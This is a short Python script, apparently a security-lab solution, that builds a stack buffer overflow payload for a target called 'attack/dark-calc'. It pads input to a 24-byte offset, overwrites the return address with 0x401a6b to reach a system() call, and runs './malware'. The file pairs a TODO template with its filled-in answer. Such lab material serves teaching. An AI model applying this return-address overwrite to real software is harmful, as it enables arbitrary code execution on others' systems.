#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""

#!/usr/bin/env python3
import sys
import struct

# 需要执行的命令，以 NULL 结束
command = b"./malware\x00"

# input() 中返回地址的偏移量
offset = 24

# eval() 内设置 system 参数的位置
target_addr = 0x401a6b

# 构造栈溢出数据
payload = command
payload += b"A" * (offset - len(command))
payload += struct.pack("<Q", target_addr)

# 以原始字节形式输出
sys.stdout.buffer.write(payload)
